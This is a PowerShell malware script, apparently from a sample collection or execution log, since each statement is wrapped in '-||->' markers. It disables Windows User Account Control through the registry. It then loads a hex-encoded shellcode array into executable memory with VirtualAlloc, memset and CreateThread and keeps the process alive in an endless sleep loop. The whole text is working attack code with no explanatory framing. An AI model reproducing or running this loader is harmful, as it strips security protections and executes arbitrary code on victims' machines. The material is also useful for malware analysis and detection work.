

 -||-> function Disable-UserAccessControl{



	[CmdletBinding()]
	param(
        
	)
    
	
	
	
	
	 -||-> Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 00000000 <-||- 
	 -||-> if( -||-> Get-ItemProperty -Path "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system" -Name "EnableLUA"  -ErrorAction SilentlyContinue <-||- ){
		 -||-> Set-ItemProperty "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system" -Name "EnableLUA" -Value 00000000 <-||- 
    } <-||- 
	 -||-> Write-Host "User Access Control (UAC) has been disabled. Reboot required." <-||- 
} <-||- 
 -||-> $EAPI = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $EAPI -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xb8,0x2b,0x1b,0xeb,0x9c,0xdb,0xd2,0xd9,0x74,0x24,0xf4,0x5f,0x2b,0xc9,0xb1,0x47,0x83,0xef,0xfc,0x31,0x47,0x0f,0x03,0x47,0x24,0xf9,0x1e,0x60,0xd2,0x7f,0xe0,0x99,0x22,0xe0,0x68,0x7c,0x13,0x20,0x0e,0xf4,0x03,0x90,0x44,0x58,0xaf,0x5b,0x08,0x49,0x24,0x29,0x85,0x7e,0x8d,0x84,0xf3,0xb1,0x0e,0xb4,0xc0,0xd0,0x8c,0xc7,0x14,0x33,0xad,0x07,0x69,0x32,0xea,0x7a,0x80,0x66,0xa3,0xf1,0x37,0x97,0xc0,0x4c,0x84,0x1c,0x9a,0x41,0x8c,0xc1,0x6a,0x63,0xbd,0x57,0xe1,0x3a,0x1d,0x59,0x26,0x37,0x14,0x41,0x2b,0x72,0xee,0xfa,0x9f,0x08,0xf1,0x2a,0xee,0xf1,0x5e,0x13,0xdf,0x03,0x9e,0x53,0xe7,0xfb,0xd5,0xad,0x14,0x81,0xed,0x69,0x67,0x5d,0x7b,0x6a,0xcf,0x16,0xdb,0x56,0xee,0xfb,0xba,0x1d,0xfc,0xb0,0xc9,0x7a,0xe0,0x47,0x1d,0xf1,0x1c,0xc3,0xa0,0xd6,0x95,0x97,0x86,0xf2,0xfe,0x4c,0xa6,0xa3,0x5a,0x22,0xd7,0xb4,0x05,0x9b,0x7d,0xbe,0xab,0xc8,0x0f,0x9d,0xa3,0x3d,0x22,0x1e,0x33,0x2a,0x35,0x6d,0x01,0xf5,0xed,0xf9,0x29,0x7e,0x28,0xfd,0x4e,0x55,0x8c,0x91,0xb1,0x56,0xed,0xb8,0x75,0x02,0xbd,0xd2,0x5c,0x2b,0x56,0x23,0x61,0xfe,0xc3,0x26,0xf5,0xc1,0xbc,0x28,0x29,0xaa,0xbe,0x2a,0x2e,0x6a,0x36,0xcc,0x00,0x3a,0x18,0x41,0xe0,0xea,0xd8,0x31,0x88,0xe0,0xd6,0x6e,0xa8,0x0a,0x3d,0x07,0x42,0xe5,0xe8,0x7f,0xfa,0x9c,0xb0,0xf4,0x9b,0x61,0x6f,0x71,0x9b,0xea,0x9c,0x85,0x55,0x1b,0xe8,0x95,0x01,0xeb,0xa7,0xc4,0x87,0xf4,0x1d,0x62,0x27,0x61,0x9a,0x25,0x70,0x1d,0xa0,0x10,0xb6,0x82,0x5b,0x77,0xcd,0x0b,0xce,0x38,0xb9,0x73,0x1e,0xb9,0x39,0x22,0x74,0xb9,0x51,0x92,0x2c,0xea,0x44,0xdd,0xf8,0x9e,0xd5,0x48,0x03,0xf7,0x8a,0xdb,0x6b,0xf5,0xf5,0x2c,0x34,0x06,0xd0,0xac,0x08,0xd1,0x1c,0xdb,0x60,0xe1 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $GPu=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $GPu.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$GPu,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



